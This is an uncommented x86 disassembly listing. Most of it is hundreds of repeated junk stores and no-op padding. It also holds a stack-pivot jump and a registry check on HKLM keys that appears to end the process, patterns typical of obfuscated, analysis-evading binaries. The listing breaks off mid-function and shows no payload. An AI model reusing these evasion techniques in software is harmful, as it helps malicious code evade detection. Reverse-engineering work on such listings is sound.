  41d8e6:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8ed:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8f4:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8fb:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d902:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d909:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d910:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d917:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d91e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d925:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d92c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d933:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d93a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d941:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d948:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d94f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d956:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d95d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d964:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d96b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d972:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d979:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d980:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d987:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d98e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d995:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d99c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9a3:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9aa:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9b1:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9b8:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9bf:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9c6:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9cd:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9d4:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9db:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9e2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9e9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9f0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9f7:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9fe:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da05:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da0c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da13:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da1a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da21:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da28:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da2f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da36:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da3d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da44:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da4b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da52:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da59:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da60:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da67:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da6e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da75:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da7c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da83:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da8a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da91:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da98:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da9f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daa6:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daad:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dab4:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dabb:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dac2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dac9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dad0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dad7:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dade:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dae5:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daec:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daf3:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dafa:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db01:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db08:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db0f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db16:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db1d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db24:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db2b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db32:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db39:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db40:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db47:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db4e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db55:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db5c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db63:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db6a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db71:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db78:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db7f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db86:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db8d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db94:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db9b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dba2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dba9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbb0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbb7:	mov    eax,ds:0x4240dc
  41dbbc:	sub    eax,0x8
  41dbbf:	mov    ds:0x4240dc,eax
  41dbc4:	mov    esp,ebp
  41dbc6:	pop    ebp
  41dbc7:	ret    
  41dbc8:	int3   
  41dbc9:	int3   
  41dbca:	int3   
  41dbcb:	int3   
  41dbcc:	int3   
  41dbcd:	int3   
  41dbce:	int3   
  41dbcf:	int3   
  41dbd0:	push   ebp
  41dbd1:	mov    ebp,esp
  41dbd3:	push   edi
  41dbd4:	mov    edi,edi
  41dbd6:	mov    edx,edx
  41dbd8:	mov    edi,edi
  41dbda:	mov    esp,DWORD PTR ds:0x4240e0
  41dbe0:	mov    edi,edi
  41dbe2:	mov    edx,edx
  41dbe4:	mov    edi,edi
  41dbe6:	add    esp,0x4
  41dbe9:	mov    edi,edi
  41dbeb:	mov    edx,edx
  41dbed:	mov    edi,edi
  41dbef:	mov    edx,DWORD PTR ds:0x4240e4
  41dbf5:	mov    edi,edi
  41dbf7:	mov    edx,edx
  41dbf9:	jmp    edx
  41dbfb:	mov    edx,edx
  41dbfd:	pop    edi
  41dbfe:	pop    ebp
  41dbff:	ret    
  41dc00:	push   ebp
  41dc01:	mov    ebp,esp
  41dc03:	call   0x41d5d0
  41dc08:	mov    eax,ds:0x4240cc
  41dc0d:	push   eax
  41dc0e:	call   0x41d600
  41dc13:	add    esp,0x4
  41dc16:	mov    ds:0x4240c4,eax
  41dc1b:	pop    ebp
  41dc1c:	ret    
  41dc1d:	int3   
  41dc1e:	int3   
  41dc1f:	int3   
  41dc20:	push   ebp
  41dc21:	mov    ebp,esp
  41dc23:	sub    esp,0x28
  41dc26:	mov    DWORD PTR [ebp-0x28],0x4014c4
  41dc2d:	mov    DWORD PTR [ebp-0x24],0x1027
  41dc34:	mov    DWORD PTR [ebp-0x18],0x4
  41dc3b:	mov    eax,DWORD PTR [ebp-0x18]
  41dc3e:	mov    ecx,DWORD PTR [ebp-0x28]
  41dc41:	lea    edx,[ecx+eax*1+0x29]
  41dc45:	mov    DWORD PTR [ebp-0x20],edx
  41dc48:	mov    eax,DWORD PTR [ebp-0x20]
  41dc4b:	mov    DWORD PTR [ebp-0x1c],eax
  41dc4e:	mov    DWORD PTR [ebp-0x14],0x0
  41dc55:	lea    ecx,[ebp-0x14]
  41dc58:	push   ecx
  41dc59:	push   0x0
  41dc5b:	call   DWORD PTR ds:0x423450
  41dc61:	cmp    DWORD PTR [ebp-0x14],0x0
  41dc65:	jne    0x41dc6b
  41dc67:	xor    eax,eax
  41dc69:	jmp    0x41dc77
  41dc6b:	mov    edx,DWORD PTR [ebp-0x1c]
  41dc6e:	sub    edx,0x29
  41dc71:	mov    DWORD PTR ds:0x4240cc,edx
  41dc77:	mov    esp,ebp
  41dc79:	pop    ebp
  41dc7a:	ret    
  41dc7b:	int3   
  41dc7c:	int3   
  41dc7d:	int3   
  41dc7e:	int3   
  41dc7f:	int3   
  41dc80:	push   ebp
  41dc81:	mov    ebp,esp
  41dc83:	sub    esp,0xc
  41dc86:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dc8d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dc94:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dc9b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dca2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dca9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcb0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcb7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcbe:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcc5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dccc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcd3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcda:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dce1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dce8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcef:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcf6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcfd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd04:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd0b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd12:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd19:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd20:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd27:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd2e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd35:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd3c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd43:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd4a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd51:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd58:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd5f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd66:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd6d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd74:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd7b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd82:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd89:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd90:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd97:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd9e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dda5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddac:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddb3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddba:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddc1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddc8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddcf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddd6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dddd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dde4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddeb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddf2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddf9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de00:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de07:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de0e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de15:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de1c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de23:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de2a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de31:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de38:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de3f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de46:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de4d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de54:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de5b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de62:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de69:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de70:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de77:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de7e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de85:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de8c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de93:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de9a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dea1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dea8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deaf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deb6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41debd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dec4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41decb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ded2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ded9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dee0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dee7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deee:	mov    DWORD PTR [ebp-0xc],0x1024a
  41def5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41defc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df03:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df0a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df11:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df18:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df1f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df26:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df2d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df34:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df3b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df42:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df49:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df50:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df57:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df5e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df65:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df6c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df73:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df7a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df81:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df88:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df8f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df96:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df9d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfa4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfab:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfb2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfb9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfc0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfc7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfce:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfd5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfdc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfe3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfea:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dff1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dff8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfff:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e006:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e00d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e014:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e01b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e022:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e029:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e030:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e037:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e03e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e045:	mov    eax,DWORD PTR [ebp+0x8]
  41e048:	cmp    DWORD PTR [eax+0x4],0x0
  41e04c:	je     0x41e449
  41e052:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e059:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e060:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e067:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e06e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e075:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e07c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e083:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e08a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e091:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e098:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e09f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0a6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0ad:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0b4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0bb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0c2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0c9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0d0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0d7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0de:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0e5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0ec:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0f3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0fa:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e101:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e108:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e10f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e116:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e11d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e124:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e12b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e132:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e139:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e140:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e147:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e14e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e155:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e15c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e163:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e16a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e171:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e178:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e17f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e186:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e18d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e194:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e19b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1a2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1a9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1b0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1b7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1be:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1c5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1cc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1d3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1da:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1e1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1e8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1ef:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1f6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1fd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e204:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e20b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e212:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e219:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e220:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e227:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e22e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e235:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e23c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e243:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e24a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e251:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e258:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e25f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e266:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e26d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e274:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e27b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e282:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e289:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e290:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e297:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e29e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2a5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2ac:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2b3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2ba:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2c1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2c8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2cf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2d6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2dd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2e4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2eb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2f2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2f9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e300:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e307:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e30e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e315:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e31c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e323:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e32a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e331:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e338:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e33f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e346:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e34d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e354:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e35b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e362:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e369:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e370:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e377:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e37e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e385:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e38c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e393:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e39a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3a1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3a8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3af:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3b6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3bd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3c4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3cb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3d2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3d9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3e0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3e7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3ee:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3f5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e3fc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e403:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e40a:	mov    ecx,DWORD PTR [ebp+0x8]
  41e40d:	add    ecx,0x8
  41e410:	mov    DWORD PTR ds:0x4240e8,ecx
  41e416:	mov    edx,DWORD PTR [ebp+0x8]
  41e419:	mov    eax,DWORD PTR [edx+0x4]
  41e41c:	mov    ds:0x4240dc,eax
  41e421:	call   0x41d810
  41e426:	mov    ecx,DWORD PTR [ebp+0x8]
  41e429:	mov    DWORD PTR ds:0x4240d8,ecx
  41e42f:	mov    edx,DWORD PTR [ebp+0x10]
  41e432:	push   edx
  41e433:	mov    eax,DWORD PTR [ebp+0xc]
  41e436:	push   eax
  41e437:	push   0x1
  41e439:	call   0x41d6b0
  41e43e:	add    esp,0xc
  41e441:	mov    DWORD PTR [ebp+0x8],eax
  41e444:	jmp    0x41e045
  41e449:	mov    esp,ebp
  41e44b:	pop    ebp
  41e44c:	ret    
  41e44d:	int3   
  41e44e:	int3   
  41e44f:	int3   
  41e450:	push   ebp
  41e451:	mov    ebp,esp
  41e453:	sub    esp,0x7c
  41e456:	mov    DWORD PTR [ebp-0x28],0x41dbd0
  41e45d:	mov    DWORD PTR ds:0x4240e0,ebp
  41e463:	mov    DWORD PTR [ebp-0x2c],0x0
  41e46a:	mov    DWORD PTR [ebp-0x3c],0x80000002
  41e471:	mov    DWORD PTR [ebp-0x6c],0x423000
  41e478:	mov    eax,ds:0x423454
  41e47d:	mov    DWORD PTR [ebp-0x64],eax
  41e480:	mov    DWORD PTR [ebp-0xc],0x1471
  41e487:	mov    DWORD PTR [ebp-0xc],0x1471
  41e48e:	mov    ecx,DWORD PTR ds:0x4235cc
  41e494:	mov    DWORD PTR [ebp-0x60],ecx
  41e497:	lea    edx,[ebp-0x68]
  41e49a:	push   edx
  41e49b:	push   0x20019
  41e4a0:	push   0x0
  41e4a2:	push   0x423044
  41e4a7:	push   0x80000002
  41e4ac:	call   DWORD PTR [ebp-0x60]
  41e4af:	test   eax,eax
  41e4b1:	jne    0x41e4c2
  41e4b3:	push   0x0
  41e4b5:	call   DWORD PTR ds:0x42343c
  41e4bb:	xor    eax,eax
  41e4bd:	jmp    0x41e6fb
  41e4c2:	lea    eax,[ebp-0x68]
  41e4c5:	push   eax
  41e4c6:	push   0x20019
  41e4cb:	push   0x0
  41e4cd:	mov    ecx,DWORD PTR [ebp-0x6c]
  41e4d0:	push   ecx
  41e4d1:	push   0x80000002
  41e4d6:	call   DWORD PTR [ebp-0x60]
  41e4d9:	test   eax,eax
  41e4db:	je     0x41e4ec
  41e4dd:	push   0x0
  41e4df:	call   DWORD PTR ds:0x42343c
  41e4e5:	xor    eax,eax
  41e4e7:	jmp    0x41e6fb
  41e4ec:	call   0x41dc20
  41e4f1:	mov    edx,DWORD PTR ds:0x4240cc
